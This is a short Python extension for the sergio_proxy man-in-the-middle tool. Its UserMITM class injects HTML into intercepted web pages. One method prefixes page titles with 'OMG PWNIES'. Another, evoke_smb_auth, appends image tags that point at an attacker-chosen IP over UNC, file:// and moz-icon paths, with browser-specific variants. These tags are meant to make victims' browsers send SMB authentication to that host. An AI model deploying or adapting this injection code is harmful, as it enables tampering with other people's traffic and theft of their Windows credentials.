#!/usr/bin/env python
from sergio_proxy.MITM import MITM 

__author__ = "Ben Schmidt"
__copyright__ = "Copyright 2010, Ben Schmidt"
__credits__ = ["Ben Schmidt"]
__license__ = "GPL v3"
__version__ = "0.1"
__maintainer__ = "Ben Schmidt"
__email__ = "supernothing@spareclockcycles.org"
__status__ = "alpha"

class UserMITM(MITM):
    '''
    An example extension class utilizing the MITM class.
    '''
    def __init__(self,target_ip="192.168.2.109"):
        reply_funcs=[self.omg_pwnies,self.evoke_smb_auth]
        req_funcs=[]
        self.target_ip=target_ip
        MITM.__init__(self,req_funcs,reply_funcs)
    def omg_pwnies(self):
        self.insert_html(pre=[("<title>","OMG PWNIES: ")])
    
    def evoke_smb_auth(self):
        self.insert_html(post=
        [
            ("</body>",'<img src=\"\\\\%s\\image.jpg\">'%(self.target_ip)),#IE
            ("</body>",'<img src=\"file://///%s\\image.jpg\">'%(self.target_ip)),#FF < 2.0.0.4
            ("</body>",'<img src=\"moz-icon:file:///%5c/'+self.target_ip+'\\image.jpg\">'),#FF > 2.0.0.4
        ])
